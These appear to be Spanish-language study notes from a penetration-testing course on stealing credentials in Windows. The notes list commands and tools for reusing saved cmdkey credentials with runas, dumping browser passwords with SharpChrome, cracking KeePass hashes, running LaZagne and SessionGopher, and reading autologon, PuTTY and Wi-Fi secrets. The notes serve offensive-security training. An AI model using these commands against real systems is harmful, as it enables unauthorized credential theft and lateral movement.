# Windows Privilege Escalation – Further Credential Theft

Técnicas adicionales para obtener credenciales en Windows, útiles para **movimiento lateral** y **escalada de privilegios**. No cubre todos los métodos posibles, pero sí los más comunes.

---

## 1. Cmdkey – Credenciales Guardadas

### Descripción
- `cmdkey` permite crear, listar y eliminar credenciales almacenadas.
- Se usan para conexiones RDP o servicios remotos sin necesidad de volver a escribir la contraseña.
- Si encontramos credenciales guardadas, podemos reutilizarlas para RDP o ejecutar comandos como otro usuario.

### Comandos
```cmd
cmdkey /list
```
**Ejemplo de salida:**
```
Target: LegacyGeneric:target=TERMSRV/SQL01
Type: Generic
User: inlanefreight\bob
```

Podemos usar `runas` para ejecutar comandos con estas credenciales:

```powershell
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

### Uso típico
- Conexión RDP automática.
- Ejecutar binarios, PowerShell o reverse shells con privilegios del usuario almacenado.

---

## 2. Credenciales Guardadas en Navegador

### Chrome y navegadores basados en Chromium
- Los usuarios suelen guardar contraseñas en el navegador.
- Herramienta recomendada: **SharpChrome**.

**Ejemplo:**
```powershell
.\SharpChrome.exe logins /unprotect
```

Salida muestra:
- `username`
- `password`
- `origin_url`

> **Nota:** Esta acción genera eventos que pueden ser detectados por el equipo azul (IDs 4983, 4688 y 16385).

---

## 3. Password Managers (KeePass, 1Password, CyberArk, etc.)

### KeePass
- Archivos `.kdbx` almacenan credenciales localmente.
- Proceso:
  1. Localizar `.kdbx`.
  2. Extraer hash usando `keepass2john`.
  3. Crackear con `hashcat`.

Buscar ficheros .kdbx en todo el sistema:

```cmd
dir C:\*.kdbx /s /b
```
**Extracción:**
```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx > keepass_hash
```

**Crackeo con Hashcat:**
```bash
hashcat -m 13400 keepass_hash rockyou.txt
```

Si se crackea → acceso a múltiples credenciales críticas (servidores, bases de datos, etc.).

---

## 4. Búsqueda en Emails – Microsoft Exchange

- Usar [MailSniper](https://github.com/dafthack/MailSniper) para buscar términos como `pass`, `creds`, `credentials` en bandejas de entrada.
- Puede revelar credenciales compartidas o notas internas con contraseñas.

---

## 5. LaZagne – Recuperación Masiva de Credenciales

### Descripción
- Herramienta para recuperar contraseñas de múltiples aplicaciones:
  - Navegadores
  - Bases de datos
  - Herramientas de administración
  - Wi-Fi
  - Autologon, DPAPI, LSA secrets, etc.

### Uso
Ver ayuda:
```powershell
.\lazagne.exe -h
```

Ejecutar todos los módulos:
```powershell
.\lazagne.exe all
```

Ejemplo de salida:
```
Winscp passwords:
  URL: transfer.inlanefreight.local
  Login: root
  Password: Summer2020!

Credman passwords:
  URL: dev01.dev.inlanefreight.local
  Login: jordan_adm
  Password: !QAZzaq1
```

---

## 6. SessionGopher – Credenciales de Herramientas Remotas

### Descripción
- Extrae credenciales guardadas en **PuTTY, WinSCP, FileZilla, RDP, SuperPuTTY**.
- Busca y descifra información en el registro (`HKEY_USERS` y `HKEY_CURRENT_USER`).

### Uso
```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

Ejemplo:
- Detecta sesiones de PuTTY y WinSCP con host, usuario y contraseña almacenados.

---

## 7. Contraseñas en Registro (Registry)

### Windows AutoLogon
- Permite login automático guardando usuario y contraseña en claro.
- Ubicación:
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

Claves relevantes:
- `AutoAdminLogon`
- `DefaultUserName`
- `DefaultPassword`

Comando para enumerar:
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### PuTTY
- Credenciales guardadas de proxy:
```
HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

Comandos:
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

Ejemplo de credencial encontrada:
```
ProxyUsername    REG_SZ    administrator
ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!
```

---

## 8. Contraseñas de Wi-Fi

### Ver redes guardadas
```cmd
netsh wlan show profile
```

### Obtener clave
```cmd
netsh wlan show profile <SSID> key=clear
```

Salida muestra `Key Content` con la contraseña en claro.

---

## 9. Otros Métodos y Herramientas

- **Buscar credenciales en emails internos.**
- **LSA Secrets, DPAPI** (requiere privilegios elevados).
- **Combinar LaZagne y SessionGopher** para máxima cobertura.
- Revisar archivos de configuración (`.rdp`, `.ppk`, etc.) en disco.

---

## Claves

- Muchas credenciales se guardan en **texto plano** o cifrado débil.
- Recuperarlas puede permitir:
  - Escalada de privilegios local.
  - Movimiento lateral en la red.
  - Acceso a infraestructuras críticas (servidores, bases de datos, etc.).
